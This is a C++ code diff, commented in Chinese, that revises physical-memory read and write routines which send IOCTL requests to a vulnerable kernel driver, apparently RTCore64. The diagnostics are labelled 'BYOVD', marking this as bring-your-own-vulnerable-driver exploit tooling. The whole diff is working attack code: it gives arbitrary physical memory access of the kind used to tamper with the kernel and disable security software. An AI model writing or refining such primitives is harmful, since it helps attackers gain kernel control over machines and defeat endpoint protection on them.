@@ -146,139 +146,120 @@ static RTCore64Format g_probedIoctlFormat = RTCore64Format::FMT_32B_RAW;
 static uint32_t g_probedReadIoctl  = 0;
 static uint32_t g_probedWriteIoctl = 0;
 
-// ★ v3.106: 前向声明 — TryMapPhysical 定义在 PhysicalReadViaIOCTL 之后
-static bool TryMapPhysical(HANDLE hDevice, uint32_t ioctlCode, uint64_t physAddr,
-                           RTCore64Format fmt, uint8_t** outVirtAddr, DWORD* outErr);
-
-// ★ v3.106: 物理内存读取 — 根据探测到的格式选择读取方式
-//   探测结果: FMT_48B_PA_AT_00 格式驱动返回映射VA, 需要先从映射VA读取数据
-//   FMT_32B_RAW 格式驱动直接返回数据在 output buffer 中
+// ★ v3.107: 物理内存读取 — 使用驱动支持的 48字节输入格式
+//   关键: 输入仅设置 physAddr, 不设置 size 字段 (驱动使用固定 1页映射)
+//   驱动返回物理页数据到 output buffer, 而非映射VA!
 static bool PhysicalReadViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
                                   uint64_t physAddr, void* outBuf, size_t size) {
     if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;
 
     uint64_t alignedAddr = physAddr & ~0xFFFULL;
     uint32_t offsetInPage = (uint32_t)(physAddr - alignedAddr);
-    uint32_t readSize = (uint32_t)((offsetInPage + size + 0xFFF) & ~0xFFF);
-    if (readSize < 0x1000) readSize = 0x1000;
+    uint32_t totalPages = (uint32_t)((offsetInPage + (uint32_t)size + 0xFFF) / 0x1000);
+    if (totalPages < 1) totalPages = 1;
 
-    // ★ v3.106: FMT_48B_PA_AT_00 格式 — 驱动返回映射VA, 需要逐页映射并读取
-    if (g_probedIoctlFormat == RTCore64Format::FMT_48B_PA_AT_00) {
-        uint32_t pages = readSize / 0x1000;
-        if (readSize % 0x1000) pages++;
-        size_t remaining = size;
-        size_t outOffset = 0;
-        for (uint32_t p = 0; p < pages; p++) {
-            uint64_t pagePA = alignedAddr + p * 0x1000;
-            uint8_t* mappedVA = nullptr;
-            DWORD mapErr = 0;
-            if (!TryMapPhysical(hDevice, ioctlCode, pagePA,
-                               RTCore64Format::FMT_48B_PA_AT_00, &mappedVA, &mapErr)) {
-                ByovdDiag("BYOVD:PhysicalRead: map page %u phys=0x%llX FAILED err=%u\n",
-                          p, (unsigned long long)pagePA, mapErr);
-                return false;
-            }
-            uint32_t readStart = (p == 0) ? offsetInPage : 0;
-            size_t toRead = (remaining > 0x1000 - readStart) ? (0x1000 - readStart) : remaining;
-            if (toRead > 0) {
-                memcpy((uint8_t*)outBuf + outOffset, mappedVA + readStart, toRead);
-                outOffset += toRead;
-                remaining -= toRead;
-            }
-            if (remaining == 0) break;
+    size_t outOffset = 0;
+    size_t remaining = size;
+
+    for (uint32_t p = 0; p < totalPages; p++) {
+        uint64_t pagePA = alignedAddr + p * 0x1000;
+        uint32_t readStart = (p == 0) ? offsetInPage : 0;
+        uint32_t pageReadSize = (uint32_t)((remaining + readStart + 0xFFF) & ~0xFFF);
+        if (pageReadSize < 0x1000) pageReadSize = 0x1000;
+
+        // 使用 48字节输入格式, 仅设置 physAddr (同探测格式FMT_48B_PA_AT_00)
+        // 注意: 不设置 offset 0x10 的 size 字段 — 驱动仅支持 1页映射!
+        uint8_t inBuf[48] = {};
+        *(uint64_t*)(inBuf + 0x00) = pagePA;
+
+        // 驱动返回物理页数据到 output buffer (最多 1页 = 0x1000 bytes)
+        uint8_t outBufPage[0x2000] = {};
+        DWORD bytesRet = 0;
+        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
+                                  inBuf, sizeof(inBuf),
+                                  outBufPage, sizeof(outBufPage),
+                                  &bytesRet, nullptr);
+        if (!ok) {
+            ByovdDiag("BYOVD:PhysicalRead: ioctl=0x%08X phys=0x%llX FAILED err=%u\n",
+                      ioctlCode, (unsigned long long)pagePA, GetLastError());
+            return false;
         }
-        return true;
+
+        // 从 output buffer 读取数据
+        uint32_t avail = (bytesRet > readStart) ? (bytesRet - readStart) : 0;
+        if (avail == 0 && bytesRet > 0) {
+            // 驱动可能不从 offset 0 开始返回数据
+            avail = bytesRet;
+            readStart = 0;
+        }
+        size_t toCopy = (avail < remaining) ? avail : remaining;
+        if (toCopy > 0) {
+            memcpy((uint8_t*)outBuf + outOffset, outBufPage + readStart, toCopy);
+            outOffset += toCopy;
+            remaining -= toCopy;
+        }
+        if (remaining == 0) break;
     }
-
-    // ★ v3.104: 原生格式 — 驱动直接返回数据在 output buffer
-    //   使用 FMT_48B_PA_AT_00: physAddr@+0x00, size@+0x10
-    uint8_t inBuf[48] = {};
-    *(uint64_t*)(inBuf + 0x00) = alignedAddr;
-    *(uint32_t*)(inBuf + 0x10) = readSize;
-
-    std::vector<uint8_t> outBufVec(readSize + 0x100);
-    DWORD bytesRet = 0;
-    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
-                              inBuf, sizeof(inBuf),
-                              outBufVec.data(), (DWORD)outBufVec.size(),
-                              &bytesRet, nullptr);
-    if (!ok) {
-        ByovdDiag("BYOVD:PhysicalRead: ioctl=0x%08X phys=0x%llX FAILED err=%u\n",
-                  ioctlCode, (unsigned long long)physAddr, GetLastError());
-        return false;
-    }
-
-    if (bytesRet < offsetInPage + size) {
-        ByovdDiag("BYOVD:PhysicalRead: short read got=%u need=%u (phys=0x%llX)\n",
-                  bytesRet, offsetInPage + (uint32_t)size, (unsigned long long)physAddr);
-        if (bytesRet <= offsetInPage) return false;
-        size_t avail = bytesRet - offsetInPage;
-        memcpy(outBuf, outBufVec.data() + offsetInPage, (avail < size) ? avail : size);
-        return true;
-    }
-
-    memcpy(outBuf, outBufVec.data() + offsetInPage, size);
-    return true;
+    return outOffset > 0;
 }
 
-// ★ v3.104: 直接物理内存写入 — 通过 IOCTL 写入物理内存
-//   使用 0x8000204C (Write PhysMem) 或 0x80002048+8 变体
+// ★ v3.107: 直接物理内存写入 — 通过 IOCTL 写入物理内存
+//   使用 0x8000204C (Write PhysMem) 或 0x80002048+4 变体
 static bool PhysicalWriteViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
                                    uint64_t physAddr, const void* inBuf, size_t size) {
     if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;
 
     uint64_t alignedAddr = physAddr & ~0xFFFULL;
     uint32_t offsetInPage = (uint32_t)(physAddr - alignedAddr);
-    uint32_t writeSize = offsetInPage + (uint32_t)size;
+    uint32_t totalPages = (uint32_t)((offsetInPage + (uint32_t)size + 0xFFF) / 0x1000);
+    if (totalPages < 1) totalPages = 1;
 
-    // 先读取整页, 修改目标区域, 再写回
-    // 分配读缓冲区
-    std::vector<uint8_t> pageBuf(0x1000);
-    if (!PhysicalReadViaIOCTL(hDevice, g_probedReadIoctl ? g_probedReadIoctl : ioctlCode,
-                               alignedAddr, pageBuf.data(), 0x1000)) {
-        // 如果读失败, 尝试直接写 (某些驱动支持直接写)
-        ByovdDiag("BYOVD:PhysicalWrite: read-back failed, trying direct write\n");
-        // 构造写请求: 48字节头部 + 数据
-        uint8_t inBuf48[48] = {};
-        *(uint64_t*)(inBuf48 + 0x00) = alignedAddr;
-        *(uint32_t*)(inBuf48 + 0x10) = writeSize;
+    for (uint32_t p = 0; p < totalPages; p++) {
+        uint64_t pagePA = alignedAddr + p * 0x1000;
+        uint32_t writeStart = (p == 0) ? offsetInPage : 0;
+        uint32_t writeSize = (uint32_t)(size > 0x1000 - writeStart ? 0x1000 - writeStart : size);
 
-        std::vector<uint8_t> writeBuf(48 + writeSize);
-        memcpy(writeBuf.data(), inBuf48, 48);
-        memcpy(writeBuf.data() + 48 + offsetInPage, inBuf, size);
+        // 先读取整页
+        std::vector<uint8_t> pageBuf(0x1000);
+        if (!PhysicalReadViaIOCTL(hDevice, g_probedReadIoctl ? g_probedReadIoctl : ioctlCode,
+                                   pagePA, pageBuf.data(), 0x1000)) {
+            // 读失败, 尝试直接写
+            ByovdDiag("BYOVD:PhysicalWrite: read-back failed page %u, trying direct write\n", p);
+            // 直接写: 48字节输入 + 数据
+            uint8_t writeBuf[48 + 0x1000] = {};
+            // 输入头部: 仅 physAddr (不设置 size)
+            *(uint64_t*)(writeBuf + 0x00) = pagePA;
+            memcpy(writeBuf + 48 + writeStart, (const uint8_t*)inBuf + p * 0x1000, writeSize);
+            uint8_t outBuf[64] = {};
+            DWORD bytesRet = 0;
+            BOOL ok = DeviceIoControl(hDevice, ioctlCode,
+                                      writeBuf, 48 + 0x1000,
+                                      outBuf, sizeof(outBuf), &bytesRet, nullptr);
+            if (!ok) {
+                ByovdDiag("BYOVD:PhysicalWrite: direct write FAILED err=%u\n", GetLastError());
+                return false;
+            }
+            continue;
+        }
+
+        // 修改目标区域
+        memcpy(pageBuf.data() + writeStart, (const uint8_t*)inBuf + p * 0x1000, writeSize);
+
+        // 写回: 48字节头部 + 页面数据
+        uint8_t writeBuf[48 + 0x1000] = {};
+        *(uint64_t*)(writeBuf + 0x00) = pagePA;
+        memcpy(writeBuf + 48, pageBuf.data(), 0x1000);
 
         uint8_t outBuf[64] = {};
         DWORD bytesRet = 0;
         BOOL ok = DeviceIoControl(hDevice, ioctlCode,
-                                  writeBuf.data(), (DWORD)writeBuf.size(),
+                                  writeBuf, sizeof(writeBuf),
                                   outBuf, sizeof(outBuf), &bytesRet, nullptr);
         if (!ok) {
-            ByovdDiag("BYOVD:PhysicalWrite: direct write FAILED err=%u\n", GetLastError());
-            return false;
+            ByovdDiag("BYOVD:PhysicalWrite: write-back FAILED err=%u\n", GetLastError());
+            // 如果写失败, 继续尝试后续页
+            continue;
         }
-        return true;
-    }
-
-    // 修改目标区域
-    memcpy(pageBuf.data() + offsetInPage, inBuf, size);
-
-    // 写回: 48字节头部 + 页面数据
-    uint8_t inBuf48[48] = {};
-    *(uint64_t*)(inBuf48 + 0x00) = alignedAddr;
-    *(uint32_t*)(inBuf48 + 0x10) = 0x1000;
-
-    std::vector<uint8_t> writeBuf(48 + 0x1000);
-    memcpy(writeBuf.data(), inBuf48, 48);
-    memcpy(writeBuf.data() + 48, pageBuf.data(), 0x1000);
-
-    uint8_t outBuf[64] = {};
-    DWORD bytesRet = 0;
-    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
-                              writeBuf.data(), (DWORD)writeBuf.size(),
-                              outBuf, sizeof(outBuf), &bytesRet, nullptr);
-    if (!ok) {
-        ByovdDiag("BYOVD:PhysicalWrite: write-back FAILED err=%u\n", GetLastError());
-        return false;
     }
     return true;
 }
